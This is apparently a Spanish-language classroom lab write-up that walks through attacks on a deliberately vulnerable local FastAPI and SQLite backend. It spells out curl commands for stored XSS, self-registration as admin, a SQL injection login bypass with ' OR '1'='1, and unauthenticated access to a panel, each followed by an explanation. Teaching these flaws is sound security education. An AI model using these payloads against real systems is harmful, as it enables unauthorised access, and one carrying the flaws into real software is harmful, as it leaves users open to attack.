# Laboratorio: Explotación paso a paso de un backend vulnerable con FastAPI + SQLite

## 1. Registro de un usuario con código XSS como nombre

```bash
curl -X POST http://localhost:8000/register \
  -H "Content-Type: application/json" \
  -d '{"username": "<script>alert(`XSS`)</script>", "password": "xss123", "role": "user"}'
```

### Explicación:

* Se registra un usuario cuyo nombre contiene un `<script>`.
* El backend **no valida ni escapa** los datos del usuario.
* Si este dato es mostrado luego en una vista HTML (por ejemplo, en un panel de admin), el navegador ejecutaría `alert(...)`.
* Esto demuestra una **vulnerabilidad de Cross-Site Scripting (XSS)** almacenado.


## 2. Registro de un atacante como administrador

```bash
curl -X POST http://localhost:8000/register \
  -H "Content-Type: application/json" \
  -d '{"username": "eviluser", "password": "123456", "role": "admin"}'
```

### Explicación:

* El atacante se autodeclara como `"role": "admin"`.
* El sistema **acepta cualquier rol ingresado por el usuario**, sin validación.
* Esto permite una **escalación de privilegios**, una falla grave de control de acceso.


## 3. Inyección SQL para evadir autenticación

```bash
curl -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"admin\", \"password\": \"' OR '1'='1\"}"
```

### Explicación:

* Esta consulta manipula directamente el SQL vulnerable.
* `' OR '1'='1` hace que la condición de contraseña **siempre sea verdadera**.
* En sistemas mal diseñados, esto permite el login sin conocer la contraseña real.
* En tu caso, el sistema devolvió el primer match disponible (el usuario XSS), confirmando el **SQL Injection**.

## 4. Login exitoso del atacante (`eviluser`)

```bash
curl -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "eviluser", "password": "123456"}'
```

### Explicación:

* Aquí el atacante ya está registrado como administrador.
* Realiza login normalmente con sus credenciales.
* El sistema responde con:

  * `"message": "Bienvenido eviluser"`
  * `"role": "admin"`
  * `"token": "insecure-token"` (no es real, solo texto plano)
* Este comportamiento confirma que el sistema **no verifica roles ni protege los tokens**, por lo que **cualquiera puede ser admin** si así lo decide al registrarse.


## 5. Acceso al panel sin autenticación

```bash
curl http://localhost:8000/panel
```

### Explicación:

* Este endpoint se puede acceder directamente **sin token, sin login, sin sesión**.
* Devuelve siempre el mismo contenido para todos.
* Esto representa un caso claro de **Broken Access Control**:

  * No hay validación de permisos
  * No se distingue entre usuarios o roles
  * No se protege información ni acceso a funciones internas


## Resultado final del laboratorio

Con este conjunto de solicitudes, tus alumnos aprenden a:

| Técnica                 | Ataque demostrado                               |
| ----------------------- | ----------------------------------------------- |
| XSS                     | Inyección de `<script>` en el registro          |
| SQLi                    | Bypass de login usando `' OR '1'='1`            |
| Escalada de privilegios | Registro con `role=admin` sin control           |
| Broken Authentication   | Login sin verificación, sin hash, sin seguridad |
| Broken Access Control   | Acceso libre a `/panel`                         |

